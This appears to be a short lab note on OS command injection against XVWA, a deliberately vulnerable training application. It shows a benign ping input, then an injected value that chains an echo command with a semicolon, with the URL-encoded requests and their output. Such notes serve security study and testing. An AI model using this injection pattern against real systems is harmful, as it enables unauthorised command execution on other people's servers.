# OS Command Injection

Input: 127.0.0.1
URL: GET /xvwa/vulnerabilities/cmdi/?target=127.0.0.1
Output:
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.030 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.034 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.024 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2096ms
rtt min/avg/max/mdev = 0.024/0.029/0.034/0.006 ms
```

Input: 127.0.0.1; echo 'Hello World!'
URL: GET /xvwa/vulnerabilities/cmdi/?target=127.0.0.1%3B+echo+%27Hello+World%21%27
Output:
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.025 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.033 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.031 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2064ms
rtt min/avg/max/mdev = 0.025/0.029/0.033/0.007 ms
Hello World!
```

## References:
https://learning.oreilly.com/library/view/hands-on-application-penetration/9781788994064/1b4749e1-f3e0-4e65-804f-56bbd98968f2.xhtml
